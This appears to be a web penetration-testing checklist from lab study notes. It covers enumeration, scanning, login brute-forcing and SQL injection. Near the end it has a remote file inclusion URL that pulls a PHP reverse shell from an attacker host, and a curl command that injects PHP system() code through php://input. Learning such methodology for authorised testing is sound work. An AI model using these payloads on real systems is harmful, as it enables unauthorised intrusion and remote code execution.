# Web Path

## Methodology summary

* [ ] Use nmap / wappalyzer to **identify** the **technologies** used by the web server.
  * [ ] Any **known vulnerability** of the version of the technology? Think public CVE
  * [ ] Using any **well known tech**? Any **useful trick** to extract more information? Think information disclosure&#x20;
  * [ ] Any **specialised scanner** to run (like wpscan for wordpress sites)?
* [ ] Launch **general purposes scanners (gobuster, dirsearch etc)**.
* [ ] With the scans running, look at the source, network connections, cookies, robots.txt, sitemap, 404/403  error, and SSL/TLS scan.
* [ ] Start **spidering with Burp Suite.**
* [ ] When you identify a directory, also brute force that
* [ ] **Backups checking**: Test if you can find **backups** of **discovered files** appending common backup extensions.
* [ ] **Brute-Force parameters**: Try to **find hidden parameters**.
* [ ] Once you have **identified** all the possible **endpoints** accepting **user input**, check for all kind of **vulnerabilities** related to it.

## Basic Enumeration

* Find the index page
* Check wappalyzer in order to see what the page was built with
* What is the version of the web server running

### Paths

* Enumerate the url paths to see if anything is hidden, and to map the site
* Check `robots.txt`
* See if `php` files are taking parameters like `10.11.1.16/administrator/alerts/alertConfigField.php?urlConfig=`

### Is there a login form?

* If its `phpmyadmin` or another application
* Try default creds
* Try basic `SQL-i`

#### Is it user generated content?

* Is there a username?
* If there is use hydra and try to brute the login
* Try basic `SQL-i`

### Vulnerabilities

* Run `nikto`
* Exploit-db and look for vulnerabilities for the CMS or application running as well as the core version of the web server running
* Can you get RFI?

```
http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.123/php_reverse_shell.php%00
```

*

    <figure><img src="https://user-images.githubusercontent.com/75596877/133100040-9f4a1a6a-1b86-4955-9c4d-651d59e51b31.png" alt=""><figcaption></figcaption></figure>
* Can you now get RCE via RFI?

```
curl -s --data "<?system('ls -la');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
```

* Now can you get a true call back?
